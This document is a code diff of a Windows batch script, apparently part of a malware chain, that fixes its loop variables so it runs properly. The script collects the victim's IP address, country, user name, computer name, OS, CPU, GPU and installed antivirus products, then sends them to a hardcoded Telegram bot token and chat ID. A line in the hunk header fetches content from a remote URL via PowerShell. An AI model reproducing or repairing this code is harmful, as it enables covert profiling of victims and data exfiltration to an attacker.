@@ -23,41 +23,40 @@ powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githa0/0/0/0/con
 setlocal EnableDelayedExpansion
 set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
 set "CHAT_ID=5674938532"
-
-for /f "tokens=1,* delims=|" %a in ('
+for /f "tokens=1,* delims=|" %%a in ('
   powershell -NoProfile -Command ^
     "$json = Invoke-RestMethod -Uri 'http://ip-api.com/json/';" ^
     "Write-Host ($json.query + '|' + $json.country)"
 ') do (
-    set "IP=%a"
-    set "Country=%b"
+    set "IP=%%a"
+    set "Country=%%b"
 )
 
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_OperatingSystem).Caption"') do (
-    set "Windows=%a"
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_OperatingSystem).Caption"') do (
+    set "Windows=%%a"
 )
 
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_Processor).Name"') do (
-    set "CPU=%a"
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_Processor).Name"') do (
+    set "CPU=%%a"
 )
 
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_VideoController).Caption"') do (
-    set "GPU=%a"
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_VideoController).Caption"') do (
+    set "GPU=%%a"
 )
 
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "[System.Environment]::Is64BitOperatingSystem"') do (
-    if %a==True (
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "[System.Environment]::Is64BitOperatingSystem"') do (
+    if %%a==True (
         set "Arch=X64"
     ) else (
         set "Arch=X86"
     )
 )
 
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName"') do (
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "(Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName"') do (
     if defined Antivirus (
-        set "Antivirus=!Antivirus!,%a"
+        set "Antivirus=!Antivirus!,%%a"
     ) else (
-        set "Antivirus=%a"
+        set "Antivirus=%%a"
     )
 )
 
@@ -65,6 +64,6 @@ set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
 
 powershell -NoProfile -Command ^
-  "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
+      "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
   "Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
 endlocal
